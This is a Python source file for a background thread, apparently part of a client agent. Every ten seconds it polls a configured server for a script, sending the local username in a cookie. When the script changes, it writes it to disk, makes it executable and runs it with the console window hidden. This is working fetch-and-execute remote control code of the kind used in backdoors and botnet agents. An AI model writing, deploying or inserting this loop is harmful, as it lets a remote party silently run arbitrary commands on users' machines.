﻿# -*- coding: utf-8 -*-

import os, sys
import threading
import defines
import time
import subprocess
import base64
from hashlib import md5
#import md5
import logger
import config
import requests

log = logger.getLogger(__name__)


class Scripter(threading.Thread):
    def __init__(self, selfdir):
        threading.Thread.__init__(self)
        self.selfdir = selfdir
        self.datadir = defines.getDataDIR()
        self.url = config.URL + '/script'
        self.daemon = False   
        self.active = False
        if sys.platform.startswith('win'):
            self.script = os.path.join(self.datadir, 'script', '~script.bat')
        else:
            self.script = os.path.join(self.datadir, 'script', '~script')
        self.script_out = os.path.join(os.path.dirname(self.script), 'script.out')
            
        defines.makedirs(os.path.dirname(self.script))
        defines.makedirs(self.datadir)   
        self.cookie = {"username": defines.getUserName()}
            
    
    def run(self):
        self.active = True
        while self.active:
            try:
                defines.makedirs(os.path.dirname(self.script))
                defines.makedirs(self.datadir)
                text = requests.get(self.url, cookies=self.cookie, auth=config.AUTH, timeout=(1,5)).content
                if not (os.path.exists(self.script) and md5(text).hexdigest() == md5(open(self.script, 'rb').read()).hexdigest()):
                    with open(self.script, 'wb') as fp:
                        fp.write(text)                    
                    text_out = self.exec_script()
                    with open(self.script_out, 'wb') as fp:
                        fp.write(text_out)
                    
            except Exception as e:
                log.error(e)
                
            time.sleep(10)
            
            
    def stop(self):
        self.active = False
            
    
    def exec_script(self):
        si = subprocess.STARTUPINFO()
        si.dwFlags = subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = subprocess.SW_HIDE
        os.chmod(self.script, 0755)
        return subprocess.Popen(self.script, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=False, startupinfo=si).communicate()[0]
        
            

if __name__ == "__main__":
    selfdir = os.path.abspath(os.path.dirname(__file__))
    Scripter(selfdir).start()
            